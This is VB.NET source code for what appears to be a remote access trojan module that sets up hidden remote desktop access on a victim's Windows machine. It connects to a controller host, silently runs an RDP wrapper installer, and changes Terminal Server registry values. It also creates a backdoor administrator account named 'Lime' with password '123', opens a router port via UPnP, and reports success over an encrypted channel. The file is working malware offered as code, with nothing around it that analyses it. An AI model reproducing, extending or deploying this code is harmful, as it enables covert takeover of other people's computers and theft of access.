Imports System.Net.Sockets
Imports System.Threading
Imports System.Threading.Tasks
Imports Open.Nat
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.DirectoryServices

Public Class Main

    Public Shared C As TcpClient = Nothing
    Public Shared ENDOF As String
    Public Shared HOST As String
    Public Shared PORT As Integer
    Public Shared SPL As String
    Public Shared PASS As String
    Public Shared M As New IO.MemoryStream
    Public Shared FULLPATH As String
    Public Shared HWID As String
    Public Shared BOT As String
    Public Shared Pastebin As String

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        ENDOF = K
        HOST = H
        PORT = P
        SPL = SP
        PASS = PW
        FULLPATH = FP
        HWID = HW
        BOT = BT
        Pastebin = PB

        Dim lp As Integer = 0

        Alive = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(H, P)
            Alive = True

            If Not Privileges() Then
                Try
                    Send("MSG" + SPL + "Enable Remote Desktop! " + "Client is not admin")
                    CloseMe()
                    Exit Sub
                Catch ex As Exception
                End Try
            End If

            Try
                IO.File.WriteAllBytes(IO.Path.Combine(Windows.Forms.Application.StartupPath, "Open.Nat.dll"), My.Resources.Open_Nat)
                IO.File.WriteAllBytes(IO.Path.Combine(Windows.Forms.Application.StartupPath, "System.Threading.dll"), My.Resources.System_Threading)
            Catch ex As Exception
            End Try

            'https://github.com/stascorp/rdpwrap
            Try
                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\RDPWInst.exe", My.Resources.RDPWInst)
                Dim process As New Process()
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                process.StartInfo.FileName = "cmd.exe"
                process.StartInfo.UseShellExecute = True
                process.StartInfo.CreateNoWindow = True
                process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
                process.StartInfo.Arguments = "/C RDPWInst.exe -i -o"
                process.Start()
                process.WaitForExit()
            Catch ex As Exception
                'Send("MSG" + SPL + "HRD! " + ex.Message)
            End Try

            Try
                Dim registryKey As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\Terminal Server", True)
                registryKey.SetValue("fDenyTSConnections", 0)
                Dim registryKey2 As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\Terminal Server", True)
                registryKey2.SetValue("fSingleSessionPerUser", 0)
                Dim registryKey3 As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", True)
                registryKey3.SetValue("SecurityLayer", 1)
                registryKey3.SetValue("PortNumber", 3389)
                registryKey3.Close()
            Catch ex As Exception
                'Send("MSG" + SPL + "HRD! " + ex.Message)
                Return
            End Try

            Try
                Dim AD As DirectoryEntry = New DirectoryEntry("WinNT://" & Environment.MachineName & ",computer")
                Dim NewUser As DirectoryEntry = AD.Children.Add("Lime", "user")
                NewUser.Invoke("SetPassword", New Object() {"123"})
                NewUser.Invoke("Put", New Object() {"Description", "HRPD"})
                NewUser.CommitChanges()
                Dim grp As DirectoryEntry
                grp = AD.Children.Find("Administrators", "group")

                If grp IsNot Nothing Then
                    grp.Invoke("Add", New Object() {NewUser.Path.ToString()})
                End If
            Catch ex As Exception
                'Send("MSG" + SPL + "HRD! " + ex.Message)
            End Try

            Send("WRDP")

            Try
                IO.File.Delete(IO.Path.Combine(Windows.Forms.Application.StartupPath, "Open.Nat.dll"))
                IO.File.Delete(IO.Path.Combine(Windows.Forms.Application.StartupPath, "System.Threading.dll"))
            Catch ex As Exception
            End Try

            CloseMe()

        Catch ex As Exception
        End Try
        GoTo re
re:
        Try
            If C Is Nothing Then GoTo cc
            If C.Client.Connected = False Then GoTo cc
            If Alive = False Then GoTo cc
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo cc
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(K) Then ' split packet..
                    Dim A As Array = SplitByWord(M.ToArray, K)
                    Dim T As New Threading.Thread(AddressOf Data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo cc
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo cc
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
cc:
        CloseMe()
    End Sub

    Public Shared Sub CloseMe()
        Threading.Thread.Sleep(1)
        Try
            C.Client.Close()
        Catch ex As Exception
        End Try
        Try
            C.Close()
        Catch ex2 As Exception
        End Try
        C = Nothing
        Try
            M.Dispose()
        Catch ex3 As Exception
        End Try
    End Sub

    Public Shared Sub Data(ByVal b As Byte())
        'Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)

        'Try
        '    Select Case A(0)

        '        Case "Close"
        '            CloseMe()

        '    End Select
        'Catch ex As Exception
        'End Try

    End Sub

    Public Shared Function SplitByWord(ByVal b As Byte(), ByVal WORD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WORD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WORD.Length, b.Length - (T(0).Length + WORD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Public Shared Sub Send(ByVal b As Byte())
        If Alive = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(ENDOF), 0, ENDOF.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            Alive = False
        End Try
    End Sub

    Public Shared Sub Send(ByVal S As String)
        Send(SB(AES_Encrypt(S)))
    End Sub

    Public Shared Alive As Boolean = False

    Public Shared Function SB(ByVal s As String) As Byte()
        Return Text.Encoding.UTF8.GetBytes(s)
    End Function

    Public Shared Function BS(ByVal b As Byte()) As String
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Public Shared Function AES_Encrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = SB(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function AES_Decrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Sub Start()


        OpenPort.Wait()
    End Sub

    Public Shared Function OpenPort() As System.Threading.Tasks.Task
        Dim nat = New NatDiscoverer()
        Dim cts = New CancellationTokenSource()
        cts.CancelAfter(5000)
        Dim device As NatDevice = Nothing
        Return nat.DiscoverDeviceAsync(PortMapper.Upnp, cts) _
        .ContinueWith(Function(task)
                          device = task.Result
                          Return device.GetExternalIPAsync()
                      End Function).Unwrap().ContinueWith(Function(task)
                                                              Return device.CreatePortMapAsync(New Mapping(Protocol.Tcp, 45451, 45451, 0, "port 3389"))
                                                          End Function)
    End Function

    Private Shared Function Privileges() As Boolean
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

    'https://www.codeproject.com/Articles/43405/Protecting-Your-Process-with-RtlSetProcessIsCriti
    <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)>
    Public Shared Sub SetCurrentProcessIsCritical(
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean,
                          <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
    End Sub
    Public Shared Sub CriticalProcesses_Disable()
        Try
            Dim refWasCritical As Boolean
            SetCurrentProcessIsCritical(False, refWasCritical, False)
        Catch ex As Exception
        End Try
    End Sub
End Class

